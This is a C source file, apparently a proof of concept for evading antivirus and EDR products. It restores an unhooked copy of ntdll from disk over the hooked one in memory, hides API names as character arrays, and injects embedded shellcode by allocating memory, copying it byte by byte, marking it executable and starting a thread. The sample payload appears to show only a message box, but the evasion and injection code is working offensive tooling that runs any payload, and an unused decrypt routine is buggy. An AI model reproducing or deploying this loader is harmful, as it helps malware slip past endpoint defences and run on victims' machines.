#include <windows.h>
#include <stdio.h>

#include "structs.h"
#include "ntstatus.h"
#include "proto.h"

/*
The purpose of this POC is to unhook the NTDLL module from the current process (self unhooking?)
and then map a new NTDLL entry from disk that is not hooked by an AV or EDR....
*/

unsigned char buf[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

SIZE_T bufSize = sizeof(buf);

// NT & K32 Modules
WCHAR strkernel32dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
WCHAR strntdlldll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };

// WINAPIs
char strMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
char strCreateFileMappingW[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','W', 0x0 };
char strUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

// NTAPIs
char strNtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strNtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strNtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strRtlCreateUserThread[] = { 'R','t','l','C','r','e','a','t','e','U','s','e','r','T','h','r','e','a','d', 0x0 };
char strNtWaitForSingleObject[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0x0 };


// WINAPI Prototypes
typedef BOOL(WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pfnCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
typedef LPVOID(WINAPI* pfnMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* pfnUnmapViewOfFile)(LPCVOID);

BOOL _NtDllUnhook(const HMODULE hNtdll, const LPVOID pFileMapping) {

	DWORD oldProtect = 0;
	BOOL vProtect = NULL;
	
	// Get the optional headers
	PIMAGE_DOS_HEADER pDOSHeaders = (PIMAGE_DOS_HEADER)pFileMapping;
	
	// From optional headers, get NT headers
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pFileMapping + pDOSHeaders->e_lfanew);

	// Locate the address of VirtualProtect
	pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)GetProcAddress(GetModuleHandleW(strkernel32dll), strVirtualProtect);

	// Find the .text section by going through all sections in the NT headers
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNTHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pSectionHeader->Name, ".text")) {

			// Set the address of ntdll as PAGE_EXECUTE_READWRITE
			vProtect = pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSectionHeader->VirtualAddress), pSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
			if (!vProtect) {
				printf("[-] Failed changing the ntdll section to RWX\n");
				return FALSE;
			}

			// Copy the new ntdll 
			memcpy(
				(LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSectionHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)pFileMapping + (DWORD_PTR)pSectionHeader->VirtualAddress),
				pSectionHeader->Misc.VirtualSize);

			// Restore memory protection of NtDll section to original one
			vProtect = pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSectionHeader->VirtualAddress), pSectionHeader->Misc.VirtualSize, oldProtect, &oldProtect);
			if (!vProtect) {
				wprintf(L"[-] Failed restoring original memory protection of ntdll section\n");
				return FALSE;
			}

			// Section .text was found great job
			wprintf(L"[+] Unhooked NTDLL\n");
			//wprintf(L"%p \n", (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSectionHeader->VirtualAddress));
			return  TRUE; //(LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSectionHeader->VirtualAddress);
		}
	}

	// If .text was not found return FALSE
	wprintf(L"[-] Failed unhooking NTDLL\n");
	return FALSE;


}

void _decrypt_Caesar(unsigned char buffer[], DWORD bufferSize) {

	int i = 0;

	for (i; i < sizeof(bufferSize); i++) {
		//pSleep(10);
		buffer[i] = (unsigned char)(((unsigned int)buffer[i] - 58923) & 0xFF);
	}
}


int _EnterArena(HMODULE hNtdll, unsigned char shellcode[], size_t shellcode_size) {
	wprintf(L"[+] Getting address of NTAPIs...\n");

	pfnNtAllocateVirtualMemory pNtAllocateMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, strNtAllocateVirtualMemory);
	if (NULL == pNtAllocateMemory) { return -1; }
	wprintf(L"[*] NtAllocateVirtualMemory ->	[ %p ]\n", pNtAllocateMemory);

	pfnNtWriteVirtualMemory pNtWriteMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, strNtWriteVirtualMemory);
	if (NULL == pNtWriteMemory) { return -1; }
	wprintf(L"[*] NtWriteVirtualMemory ->	[ %p ]\n", pNtWriteMemory);

	pfnNtProtectVirtualMemory pNtProtectMemory = (pfnNtProtectVirtualMemory)GetProcAddress(hNtdll, strNtProtectVirtualMemory);
	if (NULL == pNtProtectMemory) { return -1; }
	wprintf(L"[*] NtProtectVirtualMemory ->	[ %p ]\n", pNtProtectMemory);

	pfnRtlCreateUserThread pRtlCreateThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, strRtlCreateUserThread);
	if (NULL == pRtlCreateThread) { return -1; }
	wprintf(L"[*] RtlCreateUserThread ->	[ %p ]\n", pRtlCreateThread);

	pfnNtWaitForSingleObject pNtWaitForSingleObject = (pfnNtWaitForSingleObject)GetProcAddress(hNtdll, strNtWaitForSingleObject);
	if (NULL == pNtWaitForSingleObject) { return -1; }
	wprintf(L"[*] NtWaitForSingleObject ->	[ %p ]\n", pNtWaitForSingleObject);

	//------------------------------------------------------------------------------------------------------------------------

	NTSTATUS ntstatus = 0;

	SIZE_T scSize = shellcode_size;

	HANDLE hProcess = GetCurrentProcess();
	HANDLE hThread = NULL;

	PVOID baseAddress = NULL;

	ULONG bytesWritten = 0;
	ULONG oldProtect = 0;

	// allocate 
	ntstatus = pNtAllocateMemory(hProcess, &baseAddress, 0, (PULONG)&scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (ntstatus == STATUS_SUCCESS) {
		wprintf(L"[+] Memory region allocated ->	[ %p ]\n", baseAddress);
	}
	else
	{
		CloseHandle(hProcess);
		wprintf(L"[-] Error 1: [ %d ]\n", GetLastError());
	}

	//memcpy(baseAddress, shellcode, shellcode_size);
	// Move 1 byte at a time and execute :)
	for (int i = 0; i < shellcode_size; i++) {
		SIZE_T mem = (SIZE_T)baseAddress + i;
		RtlCopyMemory((LPVOID)mem, &shellcode[i], sizeof(shellcode[i]));
		//Sleep(50); // ~21.7 seconds (434 * 50)
	}

	// change protection
	ntstatus = pNtProtectMemory(hProcess, &baseAddress, (PULONG)&scSize, PAGE_EXECUTE_READ, &oldProtect);
	if (ntstatus == STATUS_SUCCESS) {
		wprintf(L"[+] Changed protection to RX\n");
	}
	else
	{
		CloseHandle(hProcess);
		wprintf(L"[-] Error 2: [ %d ]\n", GetLastError());
	}

	// create thread
	ntstatus = pRtlCreateThread(hProcess, NULL, FALSE, 0, 0, 0, baseAddress, NULL, &hThread, NULL);
	if (hThread != NULL) {
		wprintf(L"[+] Thread created ->		[ %p ]\n", hThread);
		pNtWaitForSingleObject(hThread, FALSE, NULL);
	}
	else
	{
		CloseHandle(hProcess);
		CloseHandle(hThread);
		VirtualFree(baseAddress, scSize, MEM_RELEASE);

		wprintf(L"[-] Error 3: [ %d ]\n", GetLastError());

		exit(-1);
	}

	return 0;

}

int wmain(void) {

	HANDLE hFile = NULL;
	HANDLE hFileMapping = NULL;
	LPVOID pFileMapping = NULL;

	int i = 0;

	WCHAR sNtdllPath[] = L"C:\\windows\\system32\\ntdll.dll";
	unsigned int sNtdllPath_len = sizeof(sNtdllPath);
	unsigned int strNtdlldll_len = sizeof(strntdlldll);

	// get function pointers
	pfnCreateFileMappingW pCreateFileMappingW = (pfnCreateFileMappingW)GetProcAddress(GetModuleHandleW(strkernel32dll), strCreateFileMappingW);
	pfnMapViewOfFile pMapViewOfFile = (pfnMapViewOfFile)GetProcAddress(GetModuleHandleW(strkernel32dll), strMapViewOfFile);
	pfnUnmapViewOfFile pUnmapViewOfFile = (pfnUnmapViewOfFile)GetProcAddress(GetModuleHandleW(strkernel32dll), strUnmapViewOfFile);

	// Open ntdll for read 
	hFile = CreateFileW(sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (INVALID_HANDLE_VALUE == hFile) {
		wprintf(L"[-] Can't obtain a handle to ntdll file\n");
		return 1;
	}


	// Create a mapping to ntdll
	hFileMapping = pCreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (INVALID_HANDLE_VALUE == hFileMapping) {
		wprintf(L"[-] Can't create mapping to ntdll\n");
		CloseHandle(hFile);
		return 2;
	}
	
	// Map ntdll in memory now
	pFileMapping = pMapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (NULL == pFileMapping) {
		wprintf(L"[-] Couldn't map ntdll in memory\n");
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return 3;
	}
	
	// Do the unhooking of ntdll
	if (TRUE == _NtDllUnhook(GetModuleHandleW(strntdlldll), pFileMapping)) {
		wprintf(L"\n[+] So far so hooked ;)\n");
	} 
	else { 
		wprintf(L"\n[!-!] Failure during unhooking\n"); 
		pUnmapViewOfFile(pFileMapping);
		CloseHandle(pFileMapping);
		CloseHandle(hFile);
		exit(-1);
	}

	// Clean all of the mappings and handles
	pUnmapViewOfFile(pFileMapping);
	CloseHandle(pFileMapping);
	CloseHandle(hFile);

	// Do normal injection now
	_EnterArena(GetModuleHandleW(strntdlldll), buf, bufSize);

	return 0;
}